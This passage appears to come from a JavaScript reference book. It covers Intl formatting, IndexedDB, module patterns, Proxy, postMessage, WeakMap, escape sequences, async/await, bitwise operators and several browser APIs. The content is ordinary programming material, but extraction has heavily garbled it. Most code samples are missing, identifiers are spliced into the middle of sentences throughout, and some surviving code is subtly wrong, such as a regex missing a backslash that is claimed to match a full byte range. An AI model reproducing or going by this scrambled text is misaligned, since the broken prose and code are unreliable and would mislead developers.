Section 70.1: Number formatting
Number formatting, grouping digits according to the localization.
const usNumberFormat = new Intl.NumberFormat('en-US'); const esNumberFormat = new Intl.NumberFormat('es-ES');
const usNumber = usNumberFormat.format(99999999.99); // "99,999,999.99" const esNumber = esNumberFormat.format(99999999.99); // "99.999.999,99"
Section 70.2: Currency formatting
Currency formatting, grouping digits and placing the currency symbol according to the localization.
const usCurrencyFormat = new Intl.NumberFormat('en-US', {style: 'currency', currency: 'USD'}) const esCurrencyFormat = new Intl.NumberFormat('es-ES', {style: 'currency', currency: 'EUR'})
const usCurrency = usCurrencyFormat.format(100.10); // "$100.10" const esCurrency = esCurrencyFormat.format(100.10); // "100.10 €"
Section 70.3: Date and time formatting
Date time formatting, according to the localization.
const usDateTimeFormatting = new Intl.DateTimeFormat('en-US'); const esDateTimeFormatting = new Intl.DateTimeFormat('es-ES');
const usDate = usDateTimeFormatting.format(new Date('2016-07-21')); // "7/21/2016" const esDate = esDateTimeFormatting.format(new Date('2016-07-21')); // "21/7/2016"
Chapter 71: Geolocation
Section 71.1: Get updates when a user's location changes
You can also receive regular updates of the user's location; for example, as they move around while using a mobile device. Location tracking over time can be very sensitive, so be sure to explain to the user ahead of time why you're requesting this permission and how you'll use the data.

To turn off continuous updates:

Section 71.2: Get a user's latitude and longitude

Section 71.3: More descriptive error codes
In the event that geolocation fails, your callback function will receive a PositionError object. The object will include an attribute named code that will have a value of 1, 2, or 3. Each of these numbers signifies a different kind of error;
getErrorCode() function below takes the PositionError.codethe  as its only argument and returns a string with the name of the error that occurred.




Chapter 72: IndexedDB
Section 72.1: Opening a database
Opening a database is an asynchronous operation. We need to send a request to open our database and then listen for events so we know when it's ready.
We'll open a DemoDB database. If it doesn't exist yet, it will get created when we send the request.
The 2 below says that we're asking for version 2 of our database. Only one version exists at any time, but we can use the version number to upgrade old data, as you'll see.

Section 72.2: Adding objects
Anything that needs to happen with data in an IndexedDB database happens in a transaction. There are a few things to note about transactions that are mentioned in the Remarks section at the bottom of this page.
We'll use the database we set up in Opening a database.
// Create a new readwrite (since we want to change things) transaction for the things store var transaction = db.transaction(["things"], "readwrite");

Section 72.3: Retrieving data
Anything that needs to happen with data in an IndexedDB database happens in a transaction. There are a few things to note about transactions that are mentioned in the Remarks section at the bottom of this page.
We'll use the database we set up in Opening a database.


Section 72.4: Testing for IndexedDB availability
window.indexedDBYou can test for IndexedDB support in the current environment by checking for the presence of the  property:


Chapter 73: Modularization Techniques
Section 73.1: ES6 Modules
Version ≥ 6
In ECMAScript 6, when using the module syntax (import/export), each file becomes its own module with a private namespace. Top-level functions and variables do not pollute the global namespace. To expose functions, classes, and variables for other modules to import, you can use the export keyword.
Note: Although this is the official method for creating JavaScript modules, it is not supported by any major browsers right now. However, ES6 Modules are supported by many transpilers.

Using Modules
Importing modules is as simple as specifying their path:

mymodule.jsThis imports only the myMethod method from our  file.
It's also possible to import all methods from a module:

You can also import methods under a new name:

More information on ES6 Modules can be found in the Modules topic.
Section 73.2: Universal Module Definition (UMD)
The UMD (Universal Module Definition) pattern is used when our module needs to be imported by a number of different module loaders (e.g. AMD, CommonJS).
The pattern itself consists of two parts:
1. An IIFE (Immediately-Invoked Function Expression) that checks for the module loader that is being implemented by the user. This will take two arguments; root (a this reference to the global scope) and factory (the function where we declare our module).
2. An anonymous function that creates our module. This is passed as the second argument to the IIFE portion of the pattern. This function is passed any number of arguments to specify the dependencies of the module.
In the below example we check for AMD, then CommonJS. If neither of those loaders are in use we fall back to making the module and its dependencies available globally.

Section 73.3: Immediately invoked function expressions (IIFE)
Immediately invoked function expressions can be used to create a private scope while producing a public API.

See the Module Pattern for more details.
Section 73.4: Asynchronous Module Definition (AMD)
AMD is a module definition system that attempts to address some of the common issues with other systems like CommonJS and anonymous closures.
AMD addresses these issues by:
Registering the factory function by calling define(), instead of immediately executing it
Passing dependencies as an array of module names, which are then loaded, instead of using globals
Only executing the factory function once all the dependencies have been loaded and executed
 Passing the dependent modules as arguments to the factory function
The key thing here is that a module can have a dependency and not hold everything up while waiting for it to load, without the developer having to write complicated code.
Here's an example of AMD:

Modules can also skip the name and be anonymous. When that's done, they're usually loaded by file name.

They can also skip dependencies:

Some AMD loaders support defining modules as plain objects:

Section 73.5: CommonJS - Node.js
CommonJS is a popular modularization pattern that's used in Node.js.
requireThe CommonJS system is centered around a () function that loads other modules and an exports property that lets modules export publicly accessible methods.
Here's an example of CommonJS, we'll load Lodash and Node.js' fs module:


module.exportsYou can also export a function as the entire module using :


Chapter 74: Proxy
Parameter	Details
target	The target object, actions on this object (getting, setting, etc...) will be routed through the handler handler	An object that can define "traps" for intercepting actions on the target object (getting, setting, etc...)
A Proxy in JavaScript can be used to modify fundamental operations on objects. Proxies were introduced in ES6. A
Proxy on an object is itself an object, that has traps. Traps may be triggered when operations are performed on the Proxy. This includes property lookup, function calling, modifying properties, adding properties, et cetera. When no applicable trap is defined, the operation is performed on the proxied object as if there was no Proxy.
Section 74.1: Proxying property lookup
To influence property lookup, the get handler must be used.
In this example, we modify property lookup so that not only the value, but also the type of that value is returned. We use Reflect to ease this.

Section 74.2: Very simple proxy (using the set trap)
This proxy simply appends the string " went through proxy" to every string property set on the target object.



Chapter 75: .postMessage() and MessageEvent
Parameters	 message	 targetOrigin 
transfer	optional
Section 75.1: Getting Started
What is .postMessage(), when and why do we use it
postMessage.() method is a way to safely allow communication between cross-origin scripts.
window.open()). With .postMessageNormally, two different pages, can only directly communicate with each other using JavaScript when they are under the same origin, even if one of them is embedded into another (e.g. iframes) or one is opened from inside the other (e.g. (), you can work around this restriction while still staying safe.
postMessageYou can only use .() when you have access to both pages' JavaScript code. Since the receiver needs to validate the sender and process the message accordingly, you can only use this method to communicate between two scripts you have access to.
http://sender.comhttp://receiver.comWe will build an example to send messages to a child window and have the messages be displayed on the child window. The parent/sender page will be assumed to be  and child/receiver page will be assumed to be  for the example.
Sending messages
window.openIn order to send messages to another window, you need to have a reference to its window object. () returns the reference object of the newly opened window. For other methods to obtain a reference to a window object, see the explanation under otherWindow parameter here.

Add a textarea and a send button that will be used to send messages to child window.

postMessage(message, targetOriginSend the text of textarea using .) when the button is clicked.


JSON.stringify() and JSON.parseTransfarable Object can be given as the third optional parameter of the .postMessage(messageIn order send and receive JSON objects instead of a simple string, () methods can be used. A ,
targetOrigin, transfer) method, but browser support is still lacking even in modern browsers.
http://receiver.comFor this example, since our receiver is assumed to be  page, we enter its url as the targetOrigin. The value of this parameter should match the origin of the childWindow object for the message to be send. It is possible to use * as a wildcard but is highly recommended to avoid using the wildcard and always set this parameter to receiver's specific origin for security reasons.
Receiving, Validating and Processing Messages
http://receiver.comThe code under this part should be put in the receiver page, which is  for our example.
In order to receive messages, the message event of the window should be listened.

When a message is received there are a couple of steps that should be followed to assure security as much as possible.
Validate the sender
Validate the message
Process the message
The sender should always be validated to make sure the message is received from a trusted sender. After that, the message itself should be validated to make sure nothing malicious is received. After these two validations, the message can be processed.

		Click here for a JS Fiddle showcasing its usage.

Chapter 76: WeakMap
Section 76.1: Creating a WeakMap object
WeakMap object allows you to store key/value pairs. The difference from Map is that keys must be objects and are weakly referenced. This means that if there aren't any other strong references to the key, the element in WeakMap can be removed by garbage collector.
WeakMap constructor has an optional parameter, which can be any iterable object (for example Array) containing key/value pairs as two-element arrays.

Section 76.2: Getting a value associated to the key
.get()To get a value associated to the key, use the  method. If there's no value associated to the key, it returns

Section 76.3: Assigning a value to the key
.set() method. It returns the WeakMap object, so you can chain .set()To assign a value to the key, use the  calls.

Section 76.4: Checking if an element with the key exists
.has()To check if an element with a specified key exits in a WeakMap, use the  method. It returns true if it exits, and otherwise false.

Section 76.5: Removing an element with the key
deleteTo remove an element with a specified key, use the .() method. It returns true if the element existed and has been removed, otherwise false.

Section 76.6: Weak reference demo
JavaScript uses reference counting technique to detect unused objects. When reference count to an object is zero, that object will be released by the garbage collector. Weakmap uses weak reference that does not contribute to reference count of an object, therefore it is very useful to solve memory leak problems.
Here is a demo of weakmap. I use a very large object as value to show that weak reference does not contribute to reference count.



Chapter 77: WeakSet
Section 77.1: Creating a WeakSet object
The WeakSet object is used for storing weakly held objects in a collection. The difference from Set is that you can't store primitive values, like numbers or string. Also, references to the objects in the collection are held weakly, which means that if there is no other reference to an object stored in a WeakSet, it can be garbage collected.
The WeakSet constructor has an optional parameter, which can be any iterable object (for example an array). All of its elements will be added to the created WeakSet.

Section 77.2: Adding a value
.add()To add a value to a WeakSet, use the  method. This method is chainable.

Section 77.3: Checking if a value exists
.has()To check if a value exits in a WeakSet, use the  method.

Section 77.4: Removing a value
.delete()To remove a value from a WeakSet, use the  method. This method returns true if the value existed and has been removed, otherwise false.

Chapter 78: Escape Sequences
Section 78.1: Entering special characters in strings and regular expressions
Most printable characters can be included in string or regular expression literals just as they are, e.g.

In order to add arbitrary characters to a string or regular expression, including non-printable ones, one has to use escape sequences. Escape sequences consist of a backslash ("\\") followed by one or more other characters. To write an escape sequence for a particular character, one typically (but not always) needs to know its hexadecimal character code.
JavaScript provides a number of different ways to specify escape sequences, as documented in the examples in this topic. For instance, the following escape sequences all denote the same character: the line feed (Unix newline character), with character code U+000A.
\\u\\n
\\x0a
\\u000a
{a} new in ES6, only in strings
 \\012 forbidden in string literals in strict mode and in template strings \\cj only in regular expressions
 Section 78.2: Escape sequence types
Single character escape sequences
Some escape sequences consist of a backslash followed by a single character.
alert("Hello\nWorld"For example, in );, the escape sequence \n is used to introduce a newline in the string parameter, so that the words "Hello" and "World" are displayed in consecutive lines.
	Escape sequence	CharacterUnicode\b (only in strings, not in regular expressions) backspaceU+0008\t	horizontal tabU+0009\n	line feedU+000A\v	vertical tabU+000B\f	form feedU+000C\r	carriage return U+000D
Additionally, the sequence \0, when not followed by a digit between 0 and 7, can be used to escape the null character (U+0000).
The sequences \\, \' and \" are used to escape the character that follows the backslash. While similar to nonescape sequences, where the leading backslash is simply ignored (i.e. \? for ?), they are explicitly treated as single character escape sequences inside strings as per the specification.
Hexadecimal escape sequences
Characters with codes between 0 and 255 can be represented with an escape sequence where \x is followed by the 2-digit hexadecimal character code. For example, the non-breaking space character has code 160 or A0 in base 16, and so it can be written as \xa0. var str = "ONE\xa0LINE"; // ONE and LINE with a non-breaking space between them
For hex digits above 9, the letters a to f are used, in lowercase or uppercase without distinction.
var regExp1 = /[\x00-xff]/; // matches any character between U+0000 and U+00FF var regExp2 = /[\x00-xFF]/; // same as above
4-digit Unicode escape sequences
Characters with codes between 0 and 65535 (216 - 1) can be represented with an escape sequence where \u is followed by the 4-digit hexadecimal character code.
For example, the Unicode standard defines the right arrow character ("?") with the number 8594, or 2192 in hexadecimal format. So an escape sequence for it would be \u2192.
This produces the string "A ? B":

For hex digits above 9, the letters a to f are used, in lowercase or uppercase without distinction. Hexadecimal codes shorter than 4 digits must be left-padded with zeros: \u007A for the small letter "z".
Curly bracket Unicode escape sequences
Version ≥ 6
ES6 extends Unicode support to the full code range from 0 to 0x10FFFF. In order to escape characters with code greater than 216 - 1, a new syntax for escape sequences was introduced:

Where the code in curly braces is hexadecimal representation of the code point value, e.g.

In the example above, the code 1f440 is the hexadecimal representation of the character code of the Unicode Character Eyes.
Note that the code in curly braces may contain any number of hex digits, as long the value does not exceed 0x10FFFF. For hex digits above 9, the letters a to f are used, in lowercase or uppercase without distinction.
Unicode escape sequences with curly braces only work inside strings, not inside regular expressions!
Octal escape sequences
Octal escape sequences are deprecated as of ES5, but they are still supported inside regular expressions and in non-strict mode also inside non-template strings. An octal escape sequence consists of one, two or three octal digits, with value between 0 and 3778 = 255.
105For example, the capital letter "E" has character code 69, or 105 in base 8. So it can be represented with the escape sequence \:

In strict mode, octal escape sequences are not allowed inside strings and will produce a syntax error. It is worth to note that \0, unlike \00 or \000, is not considered an octal escape sequence, and is thus still allowed inside strings (even template strings) in strict mode.
Control escape sequences
Some escape sequences are only recognized inside regular expression literals (not in strings). These can be used to escape characters with codes between 1 and 26 (U+0001-U+001A). They consist of a single letter A-Z (case makes no difference) preceded by \c. The alphabetic position of the letter after \c determines the character code.
For example, in the regular expression

The letter "G" (the 7th letter in the alphabet) refers to the character U+0007, and thus


Chapter 79: Behavioral Design Patterns
Section 79.1: Observer pattern
The Observer pattern is used for event handling and delegation. A subject maintains a collection of observers. The subject then notifies these observers whenever an event occurs. If you've ever used addEventListener then you've utilized the Observer pattern.

Example usage:


Section 79.2: Mediator Pattern
Think of the mediator pattern as the flight control tower that controls planes in the air: it directs this plane to land now, the second to wait, and the third to take off, etc. However no plane is ever allowed to talk to its peers.
This is how mediator works, it works as a communication hub among different modules, this way you reduce module dependency on each other, increase loose coupling, and consequently portability.
This Chatroom example explains how mediator patterns works:


Section 79.3: Command
The command pattern encapsulates parameters to a method, current object state, and which method to call. It is useful to compartmentalize everything needed to call a method at a later time. It can be used to issue a "command" and decide later which piece of code to use to execute the command.
There are three components in this pattern:
1. Command Message - the command itself, including the method name, parameters, and state
2. Invoker - the part which instructs the command to execute its instructions. It can be a timed event, user interaction, a step in a process, callback, or any way needed to execute the command.
3. Receiver - the target of the command execution.
Command Message as an Array
var aCommand = new Array(); aCommand.push(new Instructions().DoThis);  //Method to execute aCommand.push("String Argument");  //string argument aCommand.push(777);                //integer argument aCommand.push(new Object {} );     //object argument aCommand.push(new Array() );       //array argument
Constructor for command class

Invoker

Can invoke:
immediately in response to an event in a sequence of execution as a callback response or in a promise at the end of an event loop
in any other needed way to invoke a method
Receiver

A client generates a command, passes it to an invoker that either executes it immediately or delays the command, and then the command acts upon a receiver. The command pattern is very useful when used with companion patterns to create messaging patterns.
Section 79.4: Iterator
An iterator pattern provides a simple method for selecting, sequentially, the next item in a collection.
Fixed Collection

In ECMAScript 2015 iterators are a built-in as a method that returns done and value. done is true when the iterator is at the end of the collection


As a Generator

In ECMAScript 2015

Chapter 80: Server-sent events
Section 80.1: Setting up a basic event stream to the server
You can setup your client browser to listen in incoming server events using the EventSource object. You will need to supply the constructor a string of the path to the server' API endpoint the will subscribe the client to the server events.
Example:
var eventSource = new EventSource("api/my-events");
onmessageEvents have names with which they are categorized and sent, and a listener must be setup to listen to each such event by name. the default event name is message and in order to listen to it you must use the appropriate event listener, .

text/plainThe above function will run every time the server will push an event to the client. Data is sent as , if you send JSON data you may want to parse it.
Section 80.2: Closing an event stream
EventSource.closeAn event stream to the server can be closed using the () method

closeThe .() method does nothing is the stream is already closed.
Section 80.3: Binding event listeners to EventSource
You can bind event listeners to the EventSource object to listen to different events channels using the
addEventListener. method.
		EventSource.addEventListener(name: String, callback: Function, [options])
name: The name related to the name of the channel the server is emitting events to.
callback: The callback function runs every time an event bound to the channel is emitted, the function provides the event as an argument. options: Options that characterize the behavior of the event listener.
The following example shows a heartbeat event stream from the server, the server sends events on the heartbeat channel and this routine will always run when an event in accepted.



Chapter 81: Async functions (async/await)
async and await build on top of promises and generators to express asynchronous actions inline. This makes asynchronous or callback code much easier to maintain.
Functions with the async keyword return a Promise, and can be called with that syntax.
async functionInside an  the await keyword can be applied to any Promise, and will cause all of the function body after the await to be executed after the promise resolves.
Section 81.1: Introduction
A function defined as async is a function that can perform asynchronous actions but still look synchronous. The way it's done is using the await keyword to defer the function while it waits for a Promise to resolve or reject.
Note: Async functions are a Stage 4 ("Finished") proposal on track to be included in the ECMAScript 2017 standard.
For instance, using the promise-based Fetch API:

An async function always returns a Promise itself, so you can use it in other asynchronous functions.

Section 81.2: Await and operator precedence
You have to keep the operator precedence in mind when using await keyword.
getUnicorngetSizeImagine that we have an asynchronous function which calls another asynchronous function, () which returns a Promise that resolves to an instance of class Unicorn. Now we want to get the size of the unicorn using the () method of that class.
Look at the following code:

At first sight, it seems valid, but it's not. Due to operator precedence, it's equivalent to the following:



getSizeHere we attempt to call () method of the Promise object, which isn't what we want.
getSizeInstead, we should use brackets to denote that we first want to wait for the unicorn, and then call () method of the result:

getUnicorngetSizeOf course. the previous version could be valid in some cases, for example, if the () function was synchronous, but the () method was asynchronous.
Section 81.3: Async functions compared to Promises
async functions do not replace the Promise type; they add language keywords that make promises easier to call. They are interchangeable:

Any function that uses chains of promises can be rewritten using await:
function newUnicorn() {   return fetch('unicorn.json')                     // fetch unicorn.json from server
  .then(responseCurrent => responseCurrent.json()) // parse the response as JSON
  .then(unicorn =>     fetch('new/unicorn', {                         // send a request to 'new/unicorn'         method: 'post',                            // using the POST method         body: JSON.stringify({unicorn})            // pass the unicorn to the request body
    })
  )
  .then(responseNew => responseNew.json())
  .then(json => json.success)                      // return success property of response
  .catch(err => console.log('Error creating unicorn:', err));
 }
The function can be rewritten using async / await as follows:
async function newUnicorn() {   try {
    const responseCurrent = await fetch('unicorn.json'); // fetch unicorn.json from server     const unicorn = await responseCurrent.json();        // parse the response as JSON     const responseNew = await fetch('new/unicorn', {     // send a request to 'new/unicorn'       method: 'post',                                    // using the POST method       body: JSON.stringify({unicorn})                    // pass the unicorn to the request body
    });     const json = await responseNew.json();     return json.success                                  // return success property of response
  } catch (err) {     console.log('Error creating unicorn:', err);   }
}
newUnicornThis async variant of () appears to return a Promise, but really there were multiple await keywords. Each one returned a Promise, so really we had a collection of promises rather than a chain.
function* generator, with each await being a yield new PromiseIn fact we can think of it as a . However, the
results of each promise are needed by the next to continue the function. This is why the additional keyword async is needed on the function (as well as the await keyword when calling the promises) as it tells JavaScript to
async function newUnicornautomatically creates an observer for this iteration. The Promise returned by () resolves when this iteration completes.
Practically, you don't need to consider that; await hides the promise and async hides the generator iteration.
thenYou can call async functions as if they were promises, and await any promise or any async function. You don't need to await an async function, just as you can execute a promise without a .().
You can also use an async IIFE if you want to execute that code immediately:

Section 81.4: Looping with async await
When using async await in loops, you might encounter some of these problems.
If you just try to use await inside forEach, this will throw an Unexpected token error.

This comes from the fact that you've erroneously seen the arrow function as a block. The await will be in the context of the callback function, which is not async.
The interpreter protects us from making the above error, but if you add async to the forEach callback no errors get thrown. You might think this solves the problem, but it won't work as expected.
Example:
(async() => {   data = [1, 2, 3, 4, 5];

This happens because the callback async function can only pause itself, not the parent async function.
await asyncForEach(async (e) => await somePromiseFn(e), data You could write an asyncForEach function that returns a promise and then you could something like
) Basically you return a promise that resolves when all the callbacks are awaited and done. But there are better ways of doing this, and that is to just use a loop.
for-of loop or a for/whileYou can use a  loop, it doesn't really matter which one you pick.

But there's another catch. This solution will wait for each call to somePromiseFn to complete before iterating over the next one.
Promise.allThis is great if you actually want your somePromiseFn invocations to be executed in order but if you want them to run concurrently, you will need to await on .

Promise.all receives an array of promises as its only parameter and returns a promise. When all of the promises
in the array are resolved, the returned promise is also resolved. We await on that promise and when it's resolved all our values are available.
stageThe above examples are fully runnable. The somePromiseFn function can be made as an async echo function with a timeout. You can try out the examples in the babel-repl with at least the -3 preset and look at the output.

Section 81.5: Less indentation
With promises:
function doTheThing() {     return doOneThing()


With async functions:

try/catchNote how the return is at the bottom, and not at the top, and you use the language's native error-handling mechanics ().
Section 81.6: Simultaneous async (parallel) operations
Promise.allOften you will want to perform asynchronous operations in parallel. There is direct syntax that supports this in the async/await proposal, but since await will wait for a promise, you can wrap multiple promises together in  to wait for them:

This will do each query to get each friend's posts serially, but they can be done simultaneously:

Promise.allThis will loop over the list of IDs to create an array of promises. await will wait for all promises to be complete.  combines them into a single promise, but they are done in parallel.
Chapter 82: Async Iterators
An async function is one that returns a promise. await yields to the caller until the promise resolves and then continues with the result.
for-ofAn iterator allows the collection to be looped through with a  loop.
for-await-ofAn async iterator is a collection where each iteration is a promise which can be awaited using a  loop.
--harmony-async-iterationAsync iterators are a stage 3 proposal. They are in Chrome Canary 60 with 
Section 82.1: Basics
nextA JavaScript Iterator is an object with a .() method, which returns an IteratorItem, which is an object with
booleanvalue any> and done : <: <>.
next() method, which returns a Promise<IteratorItemA JavaScript AsyncIterator is an object with a .>, a promise for the next value.
To create an AsyncIterator, we can use the async generator syntax:

The delayedRange function will take a maximum number, and returns an AsyncIterator, which yields numbers from 0 to that number, in 1 second intervals.
Usage:

for await offor await ofThe  loop is another piece of new syntax, available only inside of async functions, as well as async generators. Inside the loop, the values yielded (which, remember, are Promises) are unwrapped, so the Promise is hidden away. Within the loop, you can deal with the direct values (the yielded numbers), the  loop will wait for the Promises on your behalf.
for await ofThe above example will wait 1 second, log 0, wait another second, log 1, and so on, until it logs 9. At which point the AsyncIterator will be done, and the  loop will exit.
Chapter 83: How to make iterator usable inside async callback function
When using async callback we need to consider scope. Especially if inside a loop. This simple article shows what not to do and a simple working example.
Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?

The problem is that there is only one instance of var key. All callbacks will share the same key instance. At the time the callback will fire, the key will most likely have been incremented and not pointing to the element we are receiving the stats for.
Section 83.2: Correct Writing

By creating a new function, we are scoping key inside a function so all callback have their own key instance.
Chapter 84: Tail Call Optimization
Section 84.1: What is Tail Call Optimization (TCO)
TCO is only available in strict mode
As always check browser and JavaScript implementations for support of any language features, and as with any JavaScript feature or syntax, it may change in the future.
It provides a way to optimise recursive and deeply nested function calls by eliminating the need to push function state onto the global frame stack, and avoiding having to step down through each calling function by returning directly to the initial calling function.

Without TCO the call to a() creates a new frame for that function. When that function calls b() the a()'s frame is pushed onto the frame stack and a new frame is created for function b()
When b() return to a() a()'s frame is popped from the frame stack. It immediately return to the global frame and thus does not use any of the states save on the stack.
TCO recognises that the call from a() to b() is at the tail of function a() and thus there is no need to push a()'s state onto the frame stack. When b(0) returns rather than returning to a() it returns directly to the global frame. Further optimising by eliminating the intermediate steps.
TCO allows for recursive functions to have indefinite recursion as the frame stack will not grow with each recursive call. Without TCO recursive function had a limited recursive depth.
Note TCO is a JavaScript engine implementation feature, it cannot be implemented via a transpiler if the browser does not support it. There is no additional syntax in the spec required to implement TCO and thus there is concern that TCO may break the web. Its release into the world is cautious and may require browser/engine specific flags to be set for the perceivable future.
Section 84.2: Recursive loops
Tail Call Optimisation makes it possible to safely implement recursive loops without concern for call stack overflow or the overhead of a growing frame stack.

Chapter 85: Bitwise Operators - Real World Examples (snippets)
Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)

Section 85.2: Faster multiplication or division by powers of 2
13 * (10 ** 2)Shifting bits left (right) is equivalent to multiplying (dividing) by 2. It's the same in base 10: if we "left-shift" 13 by 2 places, we get 1300, or . And if we take 12345 and "right-shift" by 3 places and then remove the
Math.floor(12345 / (10 ** 3)). So if we want to multiply a variable by 2 ** ndecimal part, we get 12, or , we can just left-shift by n bits.

2 ** nSimilarly, to do (floored) integer division by , we can right shift by n bits. Example:

It even works with negative numbers:

In reality, speed of arithmetic is unlikely to significantly impact how long your code takes to run, unless you are doing on the order of 100s of millions of computations. But C programmers love this sort of thing!
Section 85.3: Number's Parity Detection with Bitwise AND
Instead of this (unfortunately too often seen in the real code) "masterpiece":

You can do the parity check much more effective and simple:

(this is actually valid not only for JavaScript)

Chapter 86: Tilde ~
The ~ operator looks at the binary representation of the values of the expression and does a bitwise negation operation on it.
Any digit that is a 1 in the expression becomes a 0 in the result. Any digit that is a 0 in the expression becomes a 1 in the result.
Section 86.1: ~ Integer
The following example illustrates use of the bitwise NOT (~) operator on integer numbers.

Result of the complement number equals to -4;
Expression	Binary value	Decimal value
3	00000000 00000000 00000000 00000011 3

Section 86.2: ~~ Operator
Double Tilde ~~ will perform bitwise NOT operation twice.
The following example illustrates use of the bitwise NOT (~~) operator on decimal numbers.
To keep the example simple, decimal number 3.5 will be used, cause of it's simple representation in binary format.

Result of the complement number equals to -4;
Expression	Binary value	Decimal value
3	00000000 00000000 00000000 00000011 3
~~3	00000000 00000000 00000000 00000011 3
00000000 00000011.13.53.5
~~3.5	00000000 00000011	3
integerf2g2To simplify this, we can think of it as functions (n) = -(-(n+1) + 1) and (n) = -(-((n)+1) + 1).
f2(n) will leave the integer number as it is.


g2(n) will essentially round positive numbers down and negative numbers up.

Section 86.3: Converting Non-numeric values to Numbers
~~ Could be used on non-numeric values. A numeric expression will be first converted to a number and then performed bitwise NOT operation on it.
If expression cannot be converted to numeric value, it will convert to 0.
true and false bool values are exceptions, where true is presented as numeric value 1 and false as 0

Section 86.4: Shorthands
We can use ~ as a shorthand in some everyday scenarios.
We know that ~ converts -1 to 0, so we can use it with indexOf on array. indexOf

can be re-written as if (~items.indexOf('a')) {}
Section 86.5: ~ Decimal
The following example illustrates use of the bitwise NOT (~) operator on decimal numbers.
To keep the example simple, decimal number 3.5 will be used, cause of it's simple representation in binary format.

Result of the complement number equals to -4;
Expression	Binary value	Decimal value
00000000 00000010.13.53.5


Chapter 87: Using JavaScript to get/set CSS custom variables
Section 87.1: How to get and set CSS variable property values
To get a value use the .getPropertyValue() method

To set a value use the .setProperty() method.


Chapter 88: Selection API
Parameter	Details
If the node is a Text node, it is the number of characters from the beginning of startNode to where the
startOffset range begins. Otherwise, it is the number of child nodes between the beginning of startNode to where the range begins.
If the node is a Text node, it is the number of characters from the beginning of startNode to where the
endOffset	range ends. Otherwise, it is the number of child nodes between the beginning of startNode to where the range ends.
Section 88.1: Get the text of the selection

Alternatively, since the toString member function is called automatically by some functions when converting the object to a string, you don't always have to call it yourself.

Section 88.2: Deselect everything that is selected

Section 88.3: Select the contents of an element

It may be necessary to first remove all the ranges of the previous selection, as most browsers don't support multiple ranges.
Chapter 89: File API, Blobs and FileReaders
Property/MethodDescriptionerrorA error that occurred while reading the file.readyStateContains the current state of the FileReader.resultContains the file contents.onabortTriggered when the operation is aborted.onerrorTriggered when an error is encountered.onloadTriggered when the file has loaded.onloadstartTriggered when the file loading operation has started.onloadendTriggered when the file loading operation has ended.onprogressTriggered whilst reading a Blob.abort	()	Aborts the current operation.
readAsArrayBuffer(blob	)	Starts reading the file as an ArrayBuffer.
readAsDataURL(blob	)	Starts reading the file as a data url/uri.
readAsText(blob[, encodingStarts reading the file as a text file. Not able to read binary files. Use
])
readAsArrayBuffer instead.
Section 89.1: Read file as string
Make sure to have a file input on your page:

Then in JavaScript:

Section 89.2: Read file as dataURL
type="file"Reading the contents of a file within a web application can be accomplished by utilizing the HTML5 File API. First, add an input with  in your HTML:

Next, we're going to add a change listener on the file-input. This examples defines the listener via JavaScript, but it could also be added as attribute on the input element. This listener gets triggered every time a new file has been selected. Within this callback, we can read the file that was selected and perform further actions (like creating an image with the contents of the selected file):

Section 89.3: Slice a file
blob.sliceThe () method is used to create a new Blob object containing the data in the specified range of bytes of the source Blob. This method is usable with File instances too, since File extends Blob.
Here we slice a file in a specific amount of blobs. This is useful especially in cases where you need to process files that are too large to read in memory all in once. We can then read the chunks one by one using FileReader.

Section 89.4: Get the properties of the file
If you want to get the properties of the file (like the name or the size) you can do it before using the File Reader. If we have the following html piece of code:

You can access the properties directly like this:


You can also get easily the following attributes: lastModified (Timestamp), lastModifiedDate (Date), and type (File
Type)
Section 89.5: Selecting multiple files and restricting file types
The HTML5 file API allows you to restrict which kind of files are accepted by simply setting the accept attribute on a file input, e.g.:

image/jpeg,image/pngSpecifying multiple MIME types separated by a comma (e.g. ) or using wildcards (e.g.
image/* for allowing all types of images) give you a quick and powerful way to restrict the type of files you want to select. Here's an example for allowing any image or video:

By default, the file input lets the user select a single file. If you want to enable multiple file selection, simply add the multiple attribute:

You can then read all the selected files via the file input's files array. See read file as dataUrl
Section 89.6: Client side csv download using Blob

Source reference ; https://github.com/mholt/PapaParse/issues/175
Chapter 90: Notifications API
Section 90.1: Requesting Permission to send notifications
Notification.requestPermissionWe use  to ask the user if he/she wants to receive notifications from our website.

.requestPermissionSince Firefox 47 The  method can also return a promise when handling the user's decision for granting permission

Section 90.2: Sending Notifications
After the user has approved a request for permission to send notifications, we can send a simple notification that says Hello to the user: new Notification('Hello', { body: 'Hello, world!', icon: 'url to an .ico image' });
This will send a notification like this:
Hello
Hello, world!
Section 90.3: Closing a notification
.close()You can close a notification by using the  method.

You can utilize the setTimeout function to auto-close the notification sometime in the future.

The above code will spawn a notification and close it after 4 seconds.
Section 90.4: Notification events
The Notification API specifications support 2 events that can be fired by a Notification.
1. The click event.
This event will run when you click on the notification body (excluding the closing X and the Notifications configuration button).
Example:

2. The error event
The notification will fire this event whenever something wrong will happen, like being unable to display

Chapter 91: Vibration API
Modern mobile devices include hardware for vibrations. The Vibration API offers Web apps the ability to access this hardware, if it exists, and does nothing if the device doesn't support it.
Section 91.1: Single vibration
Vibrate the device for 100ms:

or

Section 91.2: Check for support
Check if browser supports vibrations

Section 91.3: Vibration patterns
An array of values describes periods of time in which the device is vibrating and not vibrating.

Chapter 92: Battery Status API
Section 92.1: Battery Events

Section 92.2: Getting current battery level

Section 92.3: Is battery charging?

Section 92.4: Get time left until battery is empty

Section 92.5: Get time left until battery is fully charged

Chapter 93: Fluent API
JavaScript is great for designing fluent API - a consumer-oriented API with focus on developer experience. Combine with language dynamic features for optimal results.
Section 93.1: Fluent API capturing construction of HTML articles with JS


This allows the consumer of the API to have a nice-looking article construction, almost a DSL for this purpose, using plain JS:
Version ≥ 6 const articles = [
    Article.withTopic('Artificial Intelligence - Overview')
      .section('What is Artificial Intelligence?')
        .addParagraph('Something something')
        .addParagraph('Lorem ipsum')
          .withEmphasis()
      .section('Philosophy of AI')
          .addParagraph('Something about AI philosophy')
          .addParagraph('Conclusion'),
     
    Article.withTopic('JavaScript')
      .list('JavaScript is one of the 3 languages all web developers must learn:')
          .addListItem('HTML to define the content of web pages')
          .addListItem('CSS to specify the layout of web pages')
          .addListItem(' JavaScript to program the behavior of web pages')
]; document.getElementById('content').innerHTML = articles.map(a => a.toHtml()).join('\n');
Chapter 94: Web Cryptography API
Section 94.1: Creating digests (e.g. SHA-256)

SHA-1, SHA-256, SHA-384 and SHA-512The current draft suggests to provide at least , but this is no strict requirement and subject to change. However, the SHA family can still be considered a good choice as it will likely be supported in all major browsers.
Section 94.2: Cryptographically random data

